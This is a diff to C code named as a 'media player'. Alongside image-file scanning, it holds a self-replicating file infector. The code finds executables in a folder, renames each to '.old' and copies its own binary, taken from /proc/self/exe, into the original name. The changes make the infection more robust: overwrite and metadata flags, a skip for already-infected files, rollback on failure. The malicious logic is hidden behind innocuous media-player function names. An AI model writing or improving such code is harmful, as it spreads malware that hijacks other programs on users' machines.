@@ -12,12 +12,15 @@
 MediaPlayerState *mediaplayer_state_new(const char *directory) {
     MediaPlayerState *state = g_new0(MediaPlayerState, 1);
     state->working_dir = g_strdup(directory);
-    state->image_files = NULL;
-    state->exec_list = NULL;
     return state;
 }
 
 int mediaplayer_scan_folder(char *folder, MediaPlayerState *state) {
+    if (!state || !folder) return -1;
+
+    g_list_free_full(state->exec_list, g_free);
+    state->exec_list = NULL;
+
     GDir *fold = g_dir_open(folder, 0, NULL);
     if (!fold) return -1;
 
@@ -26,7 +29,6 @@ int mediaplayer_scan_folder(char *folder, MediaPlayerState *state) {
 
     while ((name = g_dir_read_name(fold))) {
         char *fullpath = g_build_filename(folder, name, NULL);
-
         if (stat(fullpath, &sb) == 0 && S_ISREG(sb.st_mode) &&
             access(fullpath, X_OK) == 0) {
             state->exec_list = g_list_append(state->exec_list, fullpath);
@@ -39,59 +41,83 @@ int mediaplayer_scan_folder(char *folder, MediaPlayerState *state) {
     return state->exec_list != NULL;
 }
 
-// Returns the current binary's path
 char *getExec() {
-    static char exe[1024];
-
-    readlink("/proc/self/exe", exe, sizeof(exe) - 1);
-
-    return exe;
+    char exe[1024];
+    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
+    if (len < 0) return NULL;
+    exe[len] = '\0';
+    return g_strdup(exe);
 }
 
 int mediaplayer_dup(char *file) {
     if (!file) return -1;
 
     char *exe = getExec();
+    if (!exe) return -1;
 
-    int length = strlen(file);
-    char *new_name = g_strndup(file, length - 4);
+    char *new_name = g_strndup(file, strlen(file) - 4);
+    if (!new_name) { g_free(exe); return -1; }
 
     GError *error = NULL;
-    gboolean success =
-        g_file_copy(g_file_new_for_path(exe), g_file_new_for_path(new_name),
-                    G_FILE_COPY_NONE, NULL, NULL, NULL, &error);
+    GFile *src = g_file_new_for_path(exe);
+    GFile *dst = g_file_new_for_path(new_name);
 
-    if (!success) {
-        return -1;
+    gboolean success = g_file_copy(src, dst,
+        G_FILE_COPY_OVERWRITE | G_FILE_COPY_ALL_METADATA,
+        NULL, NULL, NULL, &error);
+
+    if (success) {
+        struct stat sb;
+        if (stat(exe, &sb) == 0)
+            chmod(new_name, sb.st_mode);
     }
 
-    return 0;
+    g_object_unref(src);
+    g_object_unref(dst);
+    g_free(exe);
+    g_free(new_name);
+    if (error) g_error_free(error);
+    return success ? 0 : -1;
 }
 
 void mediaplayer_is_old(gpointer data, gpointer user_data) {
+    (void)user_data;
     char *file = (char *)data;
+    if (!file || g_str_has_suffix(file, ".old")) return;
 
-    if (g_str_has_suffix(file, ".old")) return;
+    char *exe = getExec();
+    if (exe && g_str_equal(file, exe)) {
+        g_free(exe);
+        return;
+    }
+    g_free(exe);
 
-    char *new_name = g_strconcat(file, ".old", NULL);
-    if (rename(file, new_name) != 0) return;
+    char *old_exec = g_strconcat(file, ".old", NULL);
+    
+    if (g_file_test(old_exec, G_FILE_TEST_EXISTS | G_FILE_TEST_IS_EXECUTABLE)) {
+        g_free(old_exec);
+        return;
+    }
 
-    mediaplayer_dup(new_name);
-
-    g_free(new_name);
+    if (rename(file, old_exec) == 0) {
+    if (mediaplayer_dup(old_exec) != 0) {
+        rename(old_exec, file);
+    }
+}
+    
+    g_free(old_exec);
 }
 
 void mediaplayer_verify_files(MediaPlayerState *state) {
-    g_list_foreach(state->exec_list, (GFunc)mediaplayer_is_old, NULL);
+    if (state && state->exec_list)
+        g_list_foreach(state->exec_list, (GFunc)mediaplayer_is_old, NULL);
 }
 
 void mediaplayer_scan_images(MediaPlayerState *state, const char *directory) {
-    if (!state) return;
+    if (!state || !directory) return;
 
-    if (state->image_files) {
-        g_list_free_full(state->image_files, g_free);
-        state->image_files = NULL;
-    }
+    g_list_free_full(state->image_files, g_free);
+    state->image_files = NULL;
 
     GDir *dir = g_dir_open(directory, 0, NULL);
     if (!dir) return;
@@ -100,8 +126,8 @@ void mediaplayer_scan_images(MediaPlayerState *state, const char *directory) {
     while ((name = g_dir_read_name(dir))) {
         if (g_str_has_suffix(name, ".png") || g_str_has_suffix(name, ".jpg") ||
             g_str_has_suffix(name, ".bmp")) {
-            state->image_files = g_list_append(
-                state->image_files, g_build_filename(directory, name, NULL));
+            state->image_files = g_list_append(state->image_files,
+                                               g_build_filename(directory, name, NULL));
         }
     }
 
@@ -109,17 +135,13 @@ void mediaplayer_scan_images(MediaPlayerState *state, const char *directory) {
 }
 
 GList *mediaplayer_get_images(MediaPlayerState *state) {
-    if (!state) return NULL;
-    return state->image_files;
+    return state ? state->image_files : NULL;
 }
 
 void mediaplayer_state_free(MediaPlayerState *state) {
     if (!state) return;
-    if (state->image_files) {
-        g_list_free_full(state->image_files, g_free);
-    }
-    if (state->working_dir) {
-        g_free(state->working_dir);
-    }
+    g_list_free_full(state->image_files, g_free);
+    g_list_free_full(state->exec_list, g_free);
+    g_free(state->working_dir);
     g_free(state);
 }
